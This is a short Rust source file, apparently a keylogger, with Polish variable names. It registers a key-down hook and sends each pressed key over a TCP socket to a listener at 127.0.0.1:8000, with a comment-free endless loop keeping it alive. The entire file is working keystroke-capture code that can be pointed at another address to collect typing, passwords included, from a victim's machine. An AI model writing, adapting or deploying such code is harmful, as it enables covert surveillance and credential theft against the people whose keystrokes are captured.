use device_query::{device_state, DeviceEvents, DeviceQuery, DeviceState, Keycode};
use std::fs::OpenOptions;
use std::net::TcpStream;
const addr:&str = "127.0.0.1:8000";
use std::io::{self,Write};
fn main() -> io::Result<()>{
    let mut dane = TcpStream::connect(addr)?;
    let device_state = DeviceState::new();
    let _guard = device_state.on_key_down(move |key| {
        let wcisniety = key.to_string();
        let mut dane2 = dane.try_clone().unwrap();
        match dane2.write_all(wcisniety.as_bytes()) {
            Ok(_) => (),
            Err(_) => ()
        }
    });
    loop{}
    Ok(())
    
}
